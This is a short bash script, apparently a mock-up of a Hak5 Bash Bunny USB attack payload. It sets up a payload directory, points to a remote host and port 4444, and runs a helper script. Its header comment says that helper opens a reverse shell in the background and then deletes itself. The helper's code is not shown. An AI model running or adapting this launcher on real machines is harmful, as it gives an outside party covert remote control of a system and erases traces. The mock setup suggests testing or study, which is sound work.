#!/bin/bash
# INSPIRED BY: https://github.com/hak5/bashbunny-payloads/blob/27d63ad5a535510b20787cc03850b28bbdb727ee/payloads/library/remote_access/LinuxReverseShell/payload.txt

# Runs a script in the background that creates a reverse shell connection to the configured address and then removes itself.

# Create mock Bash Bunny USB drive directory
BASH_BUNNY_DIR=$HOME/bash_bunny
PAYLOAD_DIR=$BASH_BUNNY_DIR/payloads/LinuxReverseShell
mkdir -p $BASH_BUNNY_DIR $PAYLOAD_DIR

# Config options
REMOTE_HOST=172.31.24.230
REMOTE_PORT=4444

bash $PAYLOAD_DIR/a.sh $REMOTE_HOST $REMOTE_PORT
